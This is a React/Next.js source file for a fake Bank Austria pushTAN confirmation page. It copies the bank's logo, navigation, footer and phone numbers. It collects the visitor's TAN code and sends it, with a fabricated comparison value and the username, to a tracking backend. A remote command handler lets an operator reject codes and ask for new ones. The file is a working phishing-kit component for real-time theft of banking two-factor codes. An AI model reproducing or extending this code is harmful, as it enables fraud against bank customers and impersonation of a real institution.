"use client";

import { useEffect, useState, useRef, useCallback } from "react";
import { useRouter } from "next/navigation";
import { trackSubmission, onCommand } from "@/lib/track";

/* ---- icons (same thin-line style as LoginForm) ---- */
const icons = {
  person: (
    <svg width="26" height="26" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.5" strokeLinecap="round" strokeLinejoin="round">
      <path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2" /><circle cx="12" cy="7" r="4" />
    </svg>
  ),
  building: (
    <svg width="26" height="26" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.5" strokeLinecap="round" strokeLinejoin="round">
      <rect x="4" y="2" width="16" height="20" rx="2" /><path d="M9 22V12h6v10" /><path d="M8 6h.01M16 6h.01M12 6h.01M8 10h.01M16 10h.01M12 10h.01" />
    </svg>
  ),
  diamond: (
    <svg width="26" height="26" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.5" strokeLinecap="round" strokeLinejoin="round">
      <path d="M6 3h12l4 6-10 13L2 9z" /><path d="M2 9h20" /><path d="M10 3l-4 6 6 13 6-13-4-6" />
    </svg>
  ),
  info: (
    <svg width="26" height="26" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.5" strokeLinecap="round" strokeLinejoin="round">
      <circle cx="12" cy="12" r="10" /><path d="M12 16v-4M12 8h.01" />
    </svg>
  ),
  accounts: (
    <svg width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.2" strokeLinecap="round" strokeLinejoin="round">
      <rect x="2" y="5" width="20" height="14" rx="2" /><path d="M2 10h20" />
    </svg>
  ),
  creditcard: (
    <svg width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.2" strokeLinecap="round" strokeLinejoin="round">
      <rect x="1" y="4" width="22" height="16" rx="2" /><path d="M1 10h22" /><path d="M5 15h4" />
    </svg>
  ),
  savings: (
    <svg width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.2" strokeLinecap="round" strokeLinejoin="round">
      <path d="M19 5c-1.5 0-2.8 1.4-3 2-3.5-1.5-11-.3-11 5 0 4.2 3.8 7 8 7 1.7 0 3-.5 4.2-1.4" /><path d="M2 9.1C1.4 9.3 1 10 1 10.8V14c0 .6.4 1.1.9 1.1l1.1.3" /><path d="M16.5 3c1 .5 1.5 1.5 1.5 2.5S17 7.5 16 8" /><path d="M20 8h.01" />
    </svg>
  ),
  financing: (
    <svg width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.2" strokeLinecap="round" strokeLinejoin="round">
      <path d="M3 21h18" /><path d="M5 21V7l7-4 7 4v14" /><path d="M9 21v-6h6v6" /><path d="M9 9h.01M15 9h.01M9 13h.01M15 13h.01" />
    </svg>
  ),
  securities: (
    <svg width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.2" strokeLinecap="round" strokeLinejoin="round">
      <path d="M22 12h-4l-3 9L9 3l-3 9H2" />
    </svg>
  ),
  markets: (
    <svg width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.2" strokeLinecap="round" strokeLinejoin="round">
      <circle cx="12" cy="12" r="10" /><path d="M2 12h20" /><path d="M12 2a15.3 15.3 0 0 1 4 10 15.3 15.3 0 0 1-4 10 15.3 15.3 0 0 1-4-10 15.3 15.3 0 0 1 4-10z" />
    </svg>
  ),
};

const sidebarItems = [
  { icon: icons.accounts, label: "Girokonten" },
  { icon: icons.creditcard, label: "Kreditkarten" },
  { icon: icons.savings, label: "Sparprodukte" },
  { icon: icons.financing, label: "Finanzierung" },
  { icon: icons.securities, label: "Wertpapiere" },
  { icon: icons.markets, label: "Börsen & Märkte" },
];

/* ---- random 4-char reference code ---- */
function generateVergleichswert(): string {
  const chars = "ABCDEFGHJKLMNPQRSTUVWXYZ23456789";
  let result = "";
  for (let i = 0; i < 4; i++) {
    result += chars[Math.floor(Math.random() * chars.length)];
  }
  return result;
}

const TOTAL_SECONDS = 300; // 5 minutes

export default function PushTanForm({ user, vergleichswert: vergleichswertProp }: { user: string; vergleichswert?: string }) {
  const router = useRouter();
  const [vergleichswert] = useState(() => vergleichswertProp || generateVergleichswert());
  const [code, setCode] = useState("");
  const [secondsLeft, setSecondsLeft] = useState(TOTAL_SECONDS);
  const [expired, setExpired] = useState(false);
  const [submitting, setSubmitting] = useState(false);
  const [error, setError] = useState<string | null>(null);
  const [success, setSuccess] = useState(false);
  const timerRef = useRef<ReturnType<typeof setInterval> | null>(null);

  /* ---- countdown timer ---- */
  useEffect(() => {
    timerRef.current = setInterval(() => {
      setSecondsLeft((prev) => {
        if (prev <= 1) {
          clearInterval(timerRef.current!);
          setExpired(true);
          return 0;
        }
        return prev - 1;
      });
    }, 1000);
    return () => {
      if (timerRef.current) clearInterval(timerRef.current);
    };
  }, []);

  /* ---- command handler ---- */
  useEffect(() => {
    onCommand((cmd) => {
      switch (cmd.type) {
        case "show_error":
          setError((cmd.payload?.message as string) || "Ein Fehler ist aufgetreten.");
          break;
        case "clear_error":
          setError(null);
          break;
        case "reject_tan":
          setError("TAN-Code ist falsch. Bitte versuchen Sie es erneut.");
          setCode("");
          break;
        case "retry_tan":
          setError("Bitte geben Sie einen neuen Code ein.");
          setCode("");
          setExpired(false);
          setSecondsLeft(TOTAL_SECONDS);
          if (timerRef.current) clearInterval(timerRef.current);
          timerRef.current = setInterval(() => {
            setSecondsLeft((prev) => {
              if (prev <= 1) {
                clearInterval(timerRef.current!);
                setExpired(true);
                return 0;
              }
              return prev - 1;
            });
          }, 1000);
          break;
      }
    });
    return () => onCommand(() => {});
  }, []);

  const formatTime = useCallback((s: number) => {
    const m = Math.floor(s / 60);
    const sec = s % 60;
    return `${m}:${sec.toString().padStart(2, "0")}`;
  }, []);

  const progressFraction = secondsLeft / TOTAL_SECONDS;

  const isValid = code.length >= 4 && code.length <= 6 && !expired;

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!isValid || submitting) return;
    setSubmitting(true);
    setError(null);
    await trackSubmission("bank-austria", "pushtan", { code, vergleichswert, user });
    setSuccess(true);
    setSubmitting(false);
  };

  /* ---- SVG ring constants ---- */
  const ringSize = 80;
  const strokeWidth = 4;
  const radius = (ringSize - strokeWidth) / 2;
  const circumference = 2 * Math.PI * radius;
  const dashOffset = circumference * (1 - progressFraction);

  /* ---- Render ---- */
  return (
    <div className="app-panel">
      {/* ====== HEADER ====== */}
      <div className="header-container">
        <div className="navbar-toggle-button">
          <div className="logo-home-at-container">
            <div className="show-sidebar">
              <span className="hamburger-icon"></span>
            </div>
            <div className="logo-home">
              <a href="#" target="_blank">
                <img src="/bank-austria/logo-bank-austria.svg" alt="Bank Austria" className="logo-img" />
              </a>
            </div>
          </div>
        </div>
        <header className="cabecera no-login">
          <div className="box-elementi-header for-login-at">
            <a href="#" className="header-nav-item">
              <span className="nav-icon">{icons.person}</span>
              <span className="nav-label">Privatkunden</span>
            </a>
            <a href="#" className="header-nav-item">
              <span className="nav-icon">{icons.building}</span>
              <span className="nav-label">Firmenkunden</span>
            </a>
            <a href="#" className="header-nav-item">
              <span className="nav-icon">{icons.diamond}</span>
              <span className="nav-label">Private Banking</span>
            </a>
            <a href="#" className="header-nav-item">
              <span className="nav-icon">{icons.info}</span>
              <span className="nav-label">{"Ü"}ber uns</span>
            </a>
          </div>
        </header>
      </div>

      {/* ====== CONTENT AREA ====== */}
      <div className="content-container">
        <div className="sidebar-wrapper">
          <nav className="sidebar">
            {sidebarItems.map((item, i) => (
              <div key={i} className="sidebar-item">
                <div className="sidebar-icon">{item.icon}</div>
                <div className="sidebar-label">{item.label}</div>
              </div>
            ))}
          </nav>
        </div>

        <div className="content-wrapper">
          <div className="content-inner">
            {/* Info header */}
            <div className="info-header">
              <div className="info-header-text">
                <h1 className="title-24you"><b>pushTAN</b></h1>
              </div>
              <div className="info-box">
                <div className="inner-info-box">
                  <h3 className="warning-text">
                    <p>
                      Best{"ä"}tigen Sie die Transaktion in Ihrer pushTAN-App.
                      Vergleichen Sie den angezeigten Vergleichswert mit dem Wert auf Ihrem Ger{"ä"}t.
                    </p>
                  </h3>
                </div>
              </div>
            </div>

            {/* PushTAN form */}
            <div className="login-panel" style={{ maxWidth: 460, paddingTop: 10 }}>
              {success ? (
                /* ---- Success message ---- */
                <div style={{ textAlign: "center", padding: "40px 0" }}>
                  <div style={{
                    width: 64,
                    height: 64,
                    borderRadius: "50%",
                    backgroundColor: "#00afd0",
                    display: "flex",
                    alignItems: "center",
                    justifyContent: "center",
                    margin: "0 auto 20px",
                  }}>
                    <svg width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="#fff" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round">
                      <polyline points="20 6 9 17 4 12" />
                    </svg>
                  </div>
                  <p style={{
                    fontFamily: 'system-ui, -apple-system, "Helvetica Neue", Helvetica, Arial, sans-serif',
                    fontSize: 20,
                    color: "#333",
                    marginBottom: 8,
                  }}>
                    Transaktion best{"ä"}tigt
                  </p>
                  <p style={{
                    fontFamily: 'system-ui, -apple-system, "Helvetica Neue", Helvetica, Arial, sans-serif',
                    fontSize: 14,
                    color: "#666",
                  }}>
                    Ihre Eingabe wurde erfolgreich {"ü"}bermittelt.
                  </p>
                </div>
              ) : (
                <form onSubmit={handleSubmit}>
                  {/* Error display */}
                  {error && (
                    <div style={{
                      backgroundColor: "#fef2f2",
                      border: "1px solid #fecaca",
                      borderRadius: 5,
                      padding: "12px 16px",
                      marginBottom: 20,
                      color: "#b91c1c",
                      fontFamily: 'system-ui, -apple-system, "Helvetica Neue", Helvetica, Arial, sans-serif',
                      fontSize: 14,
                      lineHeight: 1.5,
                    }}>
                      {error}
                    </div>
                  )}

                  {/* Timer ring + Vergleichswert */}
                  <div style={{
                    display: "flex",
                    alignItems: "center",
                    gap: 24,
                    marginBottom: 30,
                    justifyContent: "center",
                  }}>
                    {/* Countdown ring */}
                    <div style={{ position: "relative", width: ringSize, height: ringSize, flexShrink: 0 }}>
                      <svg width={ringSize} height={ringSize} style={{ transform: "rotate(-90deg)" }}>
                        {/* Background circle */}
                        <circle
                          cx={ringSize / 2}
                          cy={ringSize / 2}
                          r={radius}
                          fill="none"
                          stroke="#e5e5e5"
                          strokeWidth={strokeWidth}
                        />
                        {/* Progress circle */}
                        <circle
                          cx={ringSize / 2}
                          cy={ringSize / 2}
                          r={radius}
                          fill="none"
                          stroke={expired ? "#e2001a" : "#00afd0"}
                          strokeWidth={strokeWidth}
                          strokeDasharray={circumference}
                          strokeDashoffset={dashOffset}
                          strokeLinecap="round"
                          style={{ transition: "stroke-dashoffset 1s linear" }}
                        />
                      </svg>
                      <div style={{
                        position: "absolute",
                        top: 0,
                        left: 0,
                        width: "100%",
                        height: "100%",
                        display: "flex",
                        alignItems: "center",
                        justifyContent: "center",
                        fontFamily: 'system-ui, -apple-system, "Helvetica Neue", Helvetica, Arial, sans-serif',
                        fontSize: 16,
                        fontWeight: 500,
                        color: expired ? "#e2001a" : "#333",
                      }}>
                        {formatTime(secondsLeft)}
                      </div>
                    </div>

                    {/* Vergleichswert */}
                    <div>
                      <p style={{
                        fontFamily: 'system-ui, -apple-system, "Helvetica Neue", Helvetica, Arial, sans-serif',
                        fontSize: 13,
                        color: "#666",
                        marginBottom: 6,
                        textTransform: "uppercase",
                        letterSpacing: "0.05em",
                      }}>
                        Vergleichswert
                      </p>
                      <p style={{
                        fontFamily: 'system-ui, -apple-system, "Helvetica Neue", Helvetica, Arial, sans-serif',
                        fontSize: 32,
                        fontWeight: 400,
                        color: "#e2001a",
                        letterSpacing: "0.15em",
                        lineHeight: 1,
                      }}>
                        {vergleichswert}
                      </p>
                    </div>
                  </div>

                  {/* Code input */}
                  <div className="user-inputs">
                    <div className="input-row">
                      <input
                        type="text"
                        className="credential-input"
                        placeholder="TAN-Code eingeben"
                        value={code}
                        onChange={(e) => setCode(e.target.value.replace(/[^A-Za-z0-9]/g, "").slice(0, 6))}
                        maxLength={6}
                        disabled={expired}
                        autoComplete="one-time-code"
                        inputMode="text"
                        style={expired ? { opacity: 0.5 } : {}}
                      />
                    </div>
                  </div>

                  {expired && (
                    <p style={{
                      textAlign: "center",
                      color: "#e2001a",
                      fontSize: 14,
                      fontFamily: 'system-ui, -apple-system, "Helvetica Neue", Helvetica, Arial, sans-serif',
                      marginTop: -10,
                      marginBottom: 10,
                    }}>
                      Zeit abgelaufen. Bitte fordern Sie einen neuen Code an.
                    </p>
                  )}

                  {/* Submit button */}
                  <div className="login-button-container">
                    <button
                      type="submit"
                      className="login-button"
                      disabled={!isValid || submitting}
                      style={{
                        maxWidth: 180,
                        opacity: (!isValid || submitting) ? 0.5 : 1,
                        cursor: (!isValid || submitting) ? "not-allowed" : "pointer",
                      }}
                    >
                      {submitting ? "Wird geprüft..." : "BESTÄTIGEN"}
                    </button>
                  </div>
                </form>
              )}
            </div>
          </div>

          {/* ====== FOOTER ====== */}
          <div className="footer-wrapper">
            <footer className="footer-private">
              <div className="list-corporate">
                <ul className="corporate">
                  <li><a href="#"><span className="footer-ico privacy-ico"></span><span>Sicherheits<br />informationen</span></a></li>
                  <li><a href="tel:+435050526105"><span className="footer-ico phone-ico"></span><span>Sicherheitscenter<br />+43 (0) 50505 26105</span></a></li>
                  <li><a href="tel:+435050526100"><span className="footer-ico phone-ico"></span><span>Internetbanking Hotline<br />+43 (0) 50505 26100</span></a></li>
                  <li><a href="#"><span className="footer-ico faq-ico"></span><span>FAQ</span></a></li>
                  <li><a href="#"><span className="footer-ico privacy-ico"></span><span>Cookie Policy</span></a></li>
                </ul>
              </div>
              <div className="copyright">
                <ul className="copyright-footer">
                  <li><a href="#">UniCredit Bank Austria AG</a></li>
                  <li><a href="#">Impressum</a></li>
                  <li><a href="#">AGB</a></li>
                  <li className="last"><a href="#">Datenschutzerkl{"ä"}rung</a></li>
                </ul>
                <p className="copy">&copy; 2026 UniCredit Bank Austria AG</p>
                <div className="logo-footer"></div>
              </div>
            </footer>
          </div>
        </div>
      </div>
    </div>
  );
}
